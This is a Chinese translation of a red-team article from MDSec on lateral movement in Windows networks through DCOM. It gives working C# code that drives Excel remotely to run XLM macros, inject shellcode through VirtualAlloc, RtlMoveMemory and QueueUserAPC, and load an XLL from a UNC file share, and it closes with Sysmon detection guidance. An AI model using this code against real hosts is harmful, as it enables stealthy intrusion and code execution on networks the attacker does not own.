> 原文链接: https://www.anquanke.com//post/id/217928 


# Windows横向移动全攻略（二）：DCOM


                                阅读量   
                                **151356**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Dominic Chell，文章来源：mdsec.co.uk
                                <br>原文地址：[https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-2-dcom/](https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-2-dcom/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t01c2c8d6e7093d16dd.jpg)](https://p2.ssl.qhimg.com/t01c2c8d6e7093d16dd.jpg)



## 0x00 概述

在本系列的第一部分中，我们讨论了如何利用WMI事件订阅实现横向移动。在这篇文章中，我们将关注如何利用另一种方式——分布式组件对象模型（DCOM）来进行横向移动。由于在许多其他文章中都分析过DCOM，在这里我就不再赘述，但是我们首先还是简要介绍一下什么是DCOM，以及为什么它值得我们进一步研究和关注。

COM是Windows的一个组件，用于增强软件之间的可操作性，DCOM使用远程过程调用（RPC）将其扩展到整个网络上。因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法。<br>
使用DCOM进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管COM服务器端的软件。举例来说，如果我们滥用ShellBrowserWindow COM对象，那么就会在远程主机的现有explorer.exe进程中执行。对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向DCOM公开方法，因此防御者可能难以全面监测所有程序的执行。



## 0x01 探索DCOM方法

为了探索支持DCOM的应用程序，我们可以使用`Win32_DCOMApplication`WMI类进行列举：

[![](https://p4.ssl.qhimg.com/t0101aa41a3a79bc840.png)](https://p4.ssl.qhimg.com/t0101aa41a3a79bc840.png)

根据这个列表，接下来可以实例化每个AppID，并使用 `Get-Member`cmdlet列出可用的方法：

[![](https://p5.ssl.qhimg.com/t01d2ae2cf500e875ef.png)](https://p5.ssl.qhimg.com/t01d2ae2cf500e875ef.png)

在这个示例中，我们可以看到`ShellBrowserWindow` COM对象的公开方法。这个对象有一种比较常用的方法，就是其中的`Document.Application.ShellExecute`。



## 0x03 实际案例：以Excel为例

在我第一次进行这项研究时，我的最初目标是希望能发现一个新的COM对象。但遗憾的是，由于时间有限，我的探索工作还没有取得成果，因此，我在这里将分享一些我最常用的技术，即利用Excel横向移动到工作站。

对于如何创建Excel COM类的实例，我们有很多可以使用的方法：

[![](https://p2.ssl.qhimg.com/t0159d740b02f4c229e.png)](https://p2.ssl.qhimg.com/t0159d740b02f4c229e.png)

对这些方法进行检查，至少会找到其中两种已知的横向移动方式——ExecuteExcel4Macro和RegisterXLL。接下来，将逐一介绍如何开发C#工具，利用这两种方法来实现横向移动。

### <a class="reference-link" name="3.1%20%E5%88%A9%E7%94%A8ExecuteExcel4Macro%E5%AE%9E%E7%8E%B0%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"></a>3.1 利用ExecuteExcel4Macro实现横向移动

这项技术最早由Outflank的Stan Hegt发布，用于远程执行Excel宏。这种方法的主要优势在于，目前的反病毒引擎还没有普遍支持XLM宏，并且利用这种技术，可以在DCOM启动的excel.exe进程内以无文件的方式执行该技术。因此，这种方法允许攻击者将与横向移动技术相关的指标最小化，并降低检测的概率。<br>
首先，需要实例化Excel COM对象的实例，以执行其方法。之前我们展示了如何在PowerShell中执行此操作，等价的C#代码如下：

```
Type ComType = Type.GetTypeFromProgID("Excel.Application", REMOTE_HOST);
object excel = Activator.CreateInstance(ComType);
```

此时，我们可以开始使用`InvokeMember`调用XLM代码，来执行实例的`ExecuteExcel4Macro`方法，我们可以使用以下方法来弹出计算器：

```
excel.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, excel, new object[] `{` "EXEC(\\"calc.exe\\")" `}`);
```

为了实现这种技术的武器化，在理想情况下，我们还是希望它能以无文件的方式执行。参照Outflank的解释，XLM代码可以直接访问Win32 API，因此我们可以将其写入内存，并启动新线程，从而执行Shellcode：

```
var memaddr = Convert.ToDouble(excel.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, excel, new object[] `{` "CALL(\\"Kernel32\\",\\"VirtualAlloc\\",\\"JJJJJ\\"," + lpAddress + "," + shellcode.Length + ",4096,64)" `}`));
var startaddr = memaddr;

foreach (var b in shellcode) `{`
    var cb = String.Format("CHAR(`{`0`}`)", b);
    var macrocode = "CALL(\\"Kernel32\\",\\"RtlMoveMemory\\",\\"JJCJ\\"," + memaddr + "," + cb + ",1)";
    excel.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, excel, new object[] `{` macrocode `}`);
    memaddr++;
`}`
excel.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, excel, new object[] `{` "CALL(\\"Kernel32\\",\\"QueueUserAPC\\",\\"JJJJ\\"," + startaddr + ", -2, 0)" `}`);
```

当然，可以通过逐字节移动的方式来改进上述方法，实现远程进程注入，并加快执行速度。

### <a class="reference-link" name="3.2%20%E5%88%A9%E7%94%A8RegisterXLL%E5%AE%9E%E7%8E%B0%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"></a>3.2 利用RegisterXLL实现横向移动

我们借助Excel实现横向移动的第二种方法是RegisterXLL方法，该方法最早由Ryan Hanson发表。这种方式相对简单，顾名思义，RegisterXLL方法允许我们执行XLL文件。该文件只是xlAutoOpen导出的DLL。但是，这种方法的优势有两个，其一是文件的扩展名并不影响，其二是该方法支持UNC路径，也就是说它不需要托管在我们要进行横向移动的系统上。<br>
要编写这种技术的工具非常简单，只需要几行，就可以创建出Excel COM对象的实例，并调用带单个参数（即XLL文件路径）的RegisterXLL方法：

```
string XLLPath = "\\\\\\\\fileserver\\\\excel.log";
Type ComType = Type.GetTypeFromProgID("Excel.Application", REMOTE_HOST);
object excel = Activator.CreateInstance(ComType);
excel.GetType().InvokeMember("RegisterXLL", BindingFlags.InvokeMethod, null, excel, new object[] `{` XLLPath `}`);
```

通过下面的视频，可以展示这种技术的实际效果：<br>
视频：[https://vimeo.com/459000320](https://vimeo.com/459000320)



## 0x04 检测方式

DCOM横向移动技术的检测可能非常复杂，但是一般来说，可以检测到攻击者通过DCOM实例化了某一个进程，因为该进程将会通过`DCOMLaunch`服务执行，或者以`DllHost.exe`作为父进程来执行。可以使用Sysmon Process Create事件（ID 1）来捕获这些事件，如下图所示：

[![](https://p1.ssl.qhimg.com/t0162a4bb654df6369e.png)](https://p1.ssl.qhimg.com/t0162a4bb654df6369e.png)

我们注意到，在这种情况下，Excel会使用到`/automation -Embedding`参数，这也能表明该进程已经通过自动化的方式启动。

为了有针对性的检测攻击者是否滥用RegisterXLL技术，可以监视ImageLoad事件（ID 7），筛查其中映像为XLL文件的事件：

[![](https://p1.ssl.qhimg.com/t0155e909bc88665ca9.png)](https://p1.ssl.qhimg.com/t0155e909bc88665ca9.png)

如果要检测ExecuteExcel4Macro技术的滥用就变得更加复杂，因为宏代码会在进程中执行，并且不一定需要额外的映像加载或类似操作。
